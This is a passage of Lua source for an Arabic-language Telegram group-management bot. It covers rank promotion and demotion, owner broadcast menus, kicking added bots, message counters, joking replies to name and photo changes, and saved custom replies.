hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..text1[2]..' ) بنجاح*', 1, 'md')
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..text1[2]..' ) بنجاح*', 1, 'md')
hxousedx1:sadd(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_)
hxousedx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( '..text1[2]..' ) بنجاح*', 1, 'md')
end
else
info = "*⌯︙ المعرف غير صحيح *"
hxousedx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") and hxouse11(msg) then 

local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if hxousedx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = hxousedx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..text1[2]..' ) بنجاح*', 1, 'md')
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
hxousedx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..text1[2]..' ) بنجاح*', 1, 'md')
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..text1[2]..' ) بنجاح*', 1, 'md')
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_)
hxousedx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..result.title_..'](t.me/'..(text1[3] or 'HXOUSEiq')..')'..' )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله من ( '..text1[2]..' ) بنجاح*', 1, 'md')
end
else
info = "*⌯︙ المعرف غير صحيح *"
hxousedx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
------------ 
-----------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
hxousedx1:incr(HXOUSE..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'gg' 
elseif id:match("^(%d+)") then
hxousedx1:sadd(HXOUSE..'bot',msg.sender_user_id_)  
Chat_Type = 'pv' 
else
Chat_Type = 'gg' 
end
end 
-------------
if Chat_Type == 'pv' then 
if text == '/start' then  
if is_leader(msg) then
local Sudo_Welcome = '*⌯︙اهلا بك عزيزي المطور الاساسي \n⌯︙اليك اوامر الكيبورد الخاص بسورس فايدر*'
local key = {
{'وضع اسم البوت','ضع كليشه المطور','تحديث'},
{'الاحصائيات','المطورين','قائمه العام'},
{'ضع دعم','الكروبات','امر الاذاعه بالتوجيه'},
{'امر الاذاعه','تحديث السورس','امر الاذاعه بخاص البوت'},
{'تفعيل البوت الخدمي','تعطيل البوت الخدمي','جلب نسخه الكروبات'},
{"وضع كليشه ستارت",'رد الخاص تفعيل',"تعيين قناة الاشتراك"},
{'الغاء ✖'} 
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
if Chat_Type == 'pv' then 
if text == '/start' then  
function adding(extra,result,success)
local users = hxousedx1:scard(HXOUSE.."bot:userss")
hxousedx(tostring((hxousedx1:get(HXOUSE.."bot:leader:gr") or bot_owner)), 0, 1, "༯  هذا دز ستارت للبوت \n⌯︙ معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n⌯︙ ايديه ⌯» { "..msg.sender_user_id_.." }\n⌯︙ اصبح عدد المشتركين { "..users.." }" , 1, 'html') 
end 
getUser(msg.sender_user_id_,adding) 
end
end
if Chat_Type == 'pv' then 
if text and text:match("/start hms(.*)_(%d+)") then 
function adding(extra,result,success)
hxousedx(tostring((hxousedx1:get(HXOUSE.."bot:leader:gr") or bot_owner)), 0, 1, "༯ هذا دزوله همسه وديشوفها \n⌯︙ معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n⌯︙ ايديه ⌯» {"..msg.sender_user_id_.."}" , 1, 'html') 
end 
getUser(msg.sender_user_id_,adding) 
end 
end 
if is_leader(msg) then
if text == 'امر الاذاعه' then hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙للاذاعه في الكروبات \n⌯︙مثال { اذاعه مرحبا }\n', 1, 'md')   end
if text == 'امر الاذاعه بالتوجيه' then hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙للاذاعه بالتوجيه في الكروبات \n⌯︙قم بالرد ع الرساله وارسل امر { توجيه للكل }*', 1, 'md') end
if text == 'امر الاذاعه بخاص البوت' then hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙للاذاعه بخاص البوت \n⌯︙مثال { نشر بالخاص مرحبا } \n', 1, 'md') end
if text == 'وضع كليشه ستارت' then hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙لوضع كليشه ستارت \n⌯︙مثال { ضع رد الخاص مرحبا }\n⌯︙بعد ذالك ارسل امر { رد الخاص تفعيل }', 1, 'md') end end
--------
hxousedx1:sadd(HXOUSE.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
hxousedx1:incr(HXOUSE.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
hxousedx1:del(HXOUSE.."bot:enable:" .. msg.chat_id_)
hxousedx1:srem(HXOUSE.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end
end
getChannelFull(chat_id,promote_admin)
end
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
function getUser(user_id, cb)
    tdcli_function ({
  ID = "GetUser",
  user_id_ = user_id
    }, cb, nil)
  end
local msg = data.message_
text = msg.content_.text_
if text and not hxousedx1:get(HXOUSE..'lock:bot:ttt'..bot_id) and not hxousedx1:get(HXOUSE.."lock:bot:ttt2:"..msg.chat_id_) then 
function hxouse(extra,result,success)
if result.id_ then 
local dx = hxousedx1:get("hxouse:name"..result.id_)
if not result.first_name_ then 
if dx then 
hxousedx1:del("hxouse:name"..result.id_) 
end
end
if result.first_name_ then 
if dx and dx ~= result.first_name_ then 
local hxouse_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
  "اسمك الجديد { "..result.first_name_.." }\n مو حلو رجعه القديم ☹️👌",
  "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
  "اسمك الجديد يخبل ضلعي 🤭😹{ "..result.first_name_.." }", 
}
dxx = math.random(#hxouse_text)
hxousedx(msg.chat_id_, msg.id_, 1, hxouse_text[dxx], 1, 'html')
end  
hxousedx1:set("hxouse:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, hxouse)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and hxousedx1:get(HXOUSE.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and hxousedx1:get(HXOUSE.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and hxousedx1:get(HXOUSE.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
hxousedx1:sadd(HXOUSE..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
hxousedx1:sadd(HXOUSE..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(HXOUSE) then 
hxousedx1:srem("hxouse:addg"..bot_id, msg.chat_id_) 
hxousedx1:del(HXOUSE.."bot:charge:"..msg.chat_id_)
function hxouse(extra,result,success) 
function  reslit(f1,f2)
function hxouse333(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = bot_owner },function(arg,chat)  
hxousedx(tostring((hxousedx1:get(HXOUSE.."bot:leader:gr") or bot_owner)), 0, 1, "⌯︙ تم طرد البوت من مجموعه  \n⌯︙ ايدي العضو ~ {"..msg.sender_user_id_.."}\n⌯︙ معرف العضو ~ @"..(result.username_ or "لا يوجد").."\n⌯︙ معلومات المجموعه  \n\n⌯︙ ايدي المجموعه ~ {"..msg.chat_id_.."}\n⌯︙ اسم المجموعه  {"..f2.title_.."}\n⌯︙ { تم مسح جميع بياناتها }" , 1, 'html')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, hxouse333, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, hxouse)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if hxousedx1:get(HXOUSE..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end   
end
local msg = data.message_
text = msg.content_.text_
if text and not hxousedx1:get(HXOUSE..'lock:bot:ttt'..bot_id) and not hxousedx1:get(HXOUSE.."lock:bot:ttt2:"..msg.chat_id_) then  
function hxouse(extra,result,success)
if result.id_ then 
local dx = hxousedx1:get("hxouse:Userr"..result.id_)
if not result.username_ then 
if dx then 
hxousedx(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه : @"..dx, 1, 'html')
hxousedx1:del("hxouse:Userr"..result.id_) 
end
end
if result.username_ then 
if dx and dx ~= result.username_ then 
local hxouse_text = {
  'كمشتك ليش غيرت معرفك ولك 😹',
  "ليش غيرت معرف طشوك بقنات انحراف ؟ ⛷😹",
  "حلو معرفك الجديد منين خمطته 😹",
  "لحكو غير معرفه خمطو \n هذا معرفه القديم 🌚😹 @"..result.username_.."",
}
dxx = math.random(#hxouse_text)
hxousedx(msg.chat_id_, msg.id_, 1, hxouse_text[dxx], 1, 'html')
end  
hxousedx1:set("hxouse:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, hxouse)
end
local msg = data.message_
text = msg.content_.text_
if text and not hxousedx1:get(HXOUSE..'lock:bot:ttt'..bot_id) and not hxousedx1:get(HXOUSE.."lock:bot:ttt2:"..msg.chat_id_) then  
function dx(extra,result,success)
if result.id_ then 
local dx2 = hxousedx1:get("dx:photo"..result.id_)
if not result.profile_photo_ then 
if dx2 then 
hxousedx(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو 😂👌🏻", 1, 'html')
hxousedx1:del("dx:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if dx2 and dx2 ~= result.profile_photo_.big_.persistent_id_ then 
local dx_text = {
  "طالع صاك بالصوره الجديده ممكن نرتبط",
  "صوره فيطي الجديده غيرها",
  "صورتك الجديده فد شي 😑😹",
  "حطيت صورتي شوفوني اني صاك بنات 🙄😹",
}
dx3 = math.random(#dx_text)
hxousedx(msg.chat_id_, msg.id_, 1, dx_text[dx3], 1, 'html')
end  
hxousedx1:set("dx:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, dx)
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
function title_name(GroupID)
tdcli_function({ID ="GetChat",chat_id_=GroupID},function(arg,data)---title_name
hxousedx1:set(HXOUSE..'group:name'..GroupID,data.title_) end,nil) return hxousedx1:get(HXOUSE..'group:name'..GroupID) end
----------------hxouse
res = 'https://api.telegram.org/bot'..tokenbot
function Mute_time(chat_id,user_id,time)
local mut = res.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
return https.request(mut)
end
------------------
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
function faedr(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not hxousedx1:get(HXOUSE..'lock:bot:free'..bot_id) and hxouse11(msg) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
hxousedx1:sadd(HXOUSE.."bot:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if hxousedx1:get(HXOUSE.."bot:enable:"..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل المجموعه سابقا ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل المجموعه \n⌯︙ تم ترفع منشئ المجموعه \n⌯︙ تم رفع ادمنيه المجموعه ', 1, 'md')
openChat(msg.chat_id_,hxouse)
hxousedx1:sadd("hxouse:addg"..bot_id, msg.chat_id_)
function hxouse(f1,f2)
function hxouse333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
hxousedx1:set(HXOUSE.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
hxousedx(tostring((hxousedx1:get(HXOUSE.."bot:leader:gr") or bot_owner)), 0, 1, "⌯︙ تم تفعيل مجموعه جديده  \n⌯︙ ايدي الضافني ~ {"..msg.sender_user_id_.."}\n⌯︙ معرف الضافني ~ @"..(result.username_ or "لا يوجد").."\n⌯︙ معلومات المجموعه  \n\n⌯︙ ايدي المجموعه ~ {"..msg.chat_id_.."}\n⌯︙ اسم المجموعه  {"..f2.title_.."}\n⌯︙ رابط المجموعه \n⌯︙  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end 
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, hxouse333, nil)
end
openChat(msg.chat_id_,hxouse) 
hxousedx1:set(HXOUSE.."bot:enable:"..msg.chat_id_,true)
hxousedx1:setex(HXOUSE.."bot:charge:"..msg.chat_id_,86400,true)
hxousedx1:sadd("hxouse:addg"..bot_id, msg.chat_id_)
end end
getUser(msg.sender_user_id_,adding) 
end end
-------------------------------------hxouse
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
faedr(data.message_,data) 
----------------OLD MSG--------------------faedee
if msg.date_ < (os.time() - 30) then
print("**** OLD MSG ****")
return false
end
-------* Expire & AutoLeave *-------
---------* Secretary *-----------hxouse
if hxousedx1:get(HXOUSE.."clerk") == "On" then
function clerk(extra, result, success)
local id = tostring(msg.chat_id_)
if id:match("^(%d+)") then
if not is_admin(msg.sender_user_id_) then
local text = hxousedx1:get(HXOUSE.."textsec")
if not hxousedx1:get(HXOUSE.."secretary:"..msg.chat_id_) then
if text then
local text = text:gsub('FIRSTNAME',(result.first_name_ or ''))
local text = text:gsub('LASTNAME',(result.last_name_ or ''))
local text = text:gsub('USERNAME',('@'..result.username_ or ''))
local text = text:gsub('USERID',(result.id_ or ''))
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
hxousedx1:setex(HXOUSE.."secretary:"..msg.chat_id_,86400,true)
return false
else
return ""
end
end
end
end
end
getUser(msg.sender_user_id_,clerk)
end
-------------------------------------------hxouse
local idf = tostring(msg.chat_id_)
if not hxousedx1:get(HXOUSE.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
-------------------------------------------hxouse
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
-------------------------------------------hxouse
hxousedx1:incr(HXOUSE.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
hxousedx1:sadd(HXOUSE.."bot:groups",msg.chat_id_)
end
if not hxousedx1:sismember(HXOUSE.."bot:groups",msg.chat_id_) then
hxousedx1:sadd(HXOUSE.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not hxousedx1:sismember(HXOUSE.."bot:userss",msg.chat_id_) then
hxousedx1:sadd(HXOUSE.."bot:userss",msg.chat_id_)
end
else
if not hxousedx1:sismember(HXOUSE.."bot:groups",msg.chat_id_) then
hxousedx1:sadd(HXOUSE.."bot:groups",msg.chat_id_)
end
end
end
-------------* MSG TYPES *-----------------hxouse
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
-------------------------hxouse
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
-------------------------------------
 if msg.content_.ID == "MessageChatAddMembers" then
hxousedx1:incr(HXOUSE..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
hxousedx1:incr(HXOUSE.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
hxousedx1:incr(HXOUSE.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
hxousedx1:incr(HXOUSE.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
hxousedx1:incr(HXOUSE.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
hxousedx1:incr(HXOUSE.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
-------------------------hxouse
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
-------------------------hxouse
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
-----------------------------------hxouse
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
-------------------------hxouse
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
-------------------------hxouse
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
-------------------------hxouse
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
-------------------------hxouse
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
-------------------------hxouse
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
-------------------------faedee
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
-------------------------hxouse
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
-------------------------hxouse
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
-------------------------hxouse
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
-------------------------hxouse
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
-------------------------
end
-------------------------------------------hxouse
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
-----------------
-------------------------------------HXOUSE TEAM----------------------------------------------------------
if msg.content_.photo_ then
if hxousedx1:get(HXOUSE..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تغيير صوره المجموعه \n', 1, 'md') 
hxousedx1:del(HXOUSE..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end
------------
text = msg.content_.text_ if msg.content_.text_ or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then 
local content_text = hxousedx1:get(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then hxousedx1:del(HXOUSE..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = hxousedx1:get(HXOUSE..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then hxousedx1:set(HXOUSE..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then hxousedx1:set(HXOUSE..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then hxousedx1:set(HXOUSE..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.animation_ then hxousedx1:set(HXOUSE..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
hxousedx1:set(HXOUSE..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
hxousedx1:sadd('rep_owner'..msg.chat_id_..'',content_text) 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفظ الرد \n', 1, 'md') 
hxousedx1:del(HXOUSE..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not hxousedx1:get(HXOUSE..'lock_reeeep'..msg.chat_id_) then 
if hxousedx1:get(HXOUSE..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, hxousedx1:get(HXOUSE..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if hxousedx1:get(HXOUSE..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, hxousedx1:get(HXOUSE..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if hxousedx1:get(HXOUSE..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, hxousedx1:get(HXOUSE..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if hxousedx1:get(HXOUSE..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, hxousedx1:get(HXOUSE..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end
if hxousedx1:get(HXOUSE..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
hxousedx(msg.chat_id_, msg.id_, 1, hxousedx1:get(HXOUSE..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') , 1, 'md') 
end end
text = msg.content_.text_
if msg.content_.text_  or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then
local content_text = hxousedx1:get(HXOUSE.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
hxousedx1:del(HXOUSE.."add:repallt"..msg.sender_user_id_)
local content_text = hxousedx1:get(HXOUSE.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
hxousedx1:set(HXOUSE.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then
hxousedx1:set(HXOUSE.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
hxousedx1:set(HXOUSE.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.animation_ then
hxousedx1:set(HXOUSE.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
hxousedx1:set(HXOUSE.."text_repall"..content_text, msg.content_.text_)
end 
hxousedx1:sadd('rep_sudo',content_text)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفظ الرد \n', 1, 'md') 
hxousedx1:del(HXOUSE.."addreply2:"..msg.sender_user_id_)
return false end end
if msg.content_.text_ and not hxousedx1:get(HXOUSE..'lock_reeeep'..msg.chat_id_) then
